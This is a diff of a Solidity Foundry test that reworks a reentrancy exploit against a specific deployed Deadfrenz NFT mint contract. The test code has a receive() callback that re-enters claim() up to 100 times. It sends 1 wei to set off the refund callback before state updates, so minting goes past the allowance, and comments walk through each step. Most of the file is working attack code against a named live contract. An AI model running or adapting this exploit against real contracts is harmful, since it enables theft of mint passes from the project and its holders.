@@ -18,11 +18,31 @@ interface Deadfrenz {
 contract DeadfrenzattackTest is DSTest {
 
     Deadfrenz constant deadfrenz = Deadfrenz(0x090f688f0C11a8671C47d833AF3Cf965c30d3C35);
-    bytes32[] merkleProof = new bytes32[](13);
 
-    // This is my Merkle proof. Can't be used by any other address.
-    // The sender address is encoded as part of the merkle node, and checked in the call.
-    function setUp() public {
+    // This allows our countract to receive the ERC1155 tokens (mint passes).
+    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
+        return 0xf23a6e61;
+    }
+
+    uint256 currentAttack;
+    uint256 numAttacks = 100; // This is the number of tokens we'll be able to mint.
+
+    // The core of the reentrancy attack is this: During the call to claim, a
+    // callback is performed to return any extra ETH sent.  We use that callback
+    // to reenter.  The callback happens *before* any state variables have been
+    // updated, so we will be able to bypass the checks that we don't mint more
+    // than our allowance.
+    receive() external payable {
+        currentAttack++;
+        if (currentAttack < numAttacks) {
+            attack();
+        }
+    }
+
+    function attack() public {
+        // This is my Merkle proof. Can't be used by any other address.  The sender
+        // address is encoded as part of the merkle node, and checked in the call.
+        bytes32[] memory merkleProof = new bytes32[](13);
         merkleProof[0 ] = 0x16f65545443460f347ccb8028ca5e5a5a81d8640c6bcfdabfa470d4216012538;
         merkleProof[1 ] = 0xa4b6dd90c0722481a650412ee19a2232a0de48651312fc3c29acf4441312a429;
         merkleProof[2 ] = 0xe8078f94638a1654594fca6733cb194e8fb831183e9d842f56cd63c8bfdd7cc2;
@@ -36,23 +56,8 @@ contract DeadfrenzattackTest is DSTest {
         merkleProof[10] = 0xcf481ba0d31cb56950227d46b73e018d0836f2de7e405f9e41640f579c8510d1;
         merkleProof[11] = 0x80675db189384580cfa41e8db885b486470734e4e52f01842961e8c9174b75e7;
         merkleProof[12] = 0x0ae9f44dbdf9e3dbb4e7423a887496f300b51a6ee098c51ae1487e00463908fe;
-    }
-    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
-        return 0xf23a6e61;
-    }
-
-    uint256 currentAttack;
-    uint256 numAttacks = 100;
-
-    receive() external payable {
-        currentAttack++;
-        if (currentAttack < numAttacks) {
-            attack();
-        }
-    }
-
-    function attack() public {
-        emit log_bytes(abi.encode(merkleProof));
+        // It's important that we send along some balance, that's what causes
+        // the callback from the Deadfrenz contract.
         deadfrenz.claim{value: 1 wei}(1, 1, 2, merkleProof);
     }
 
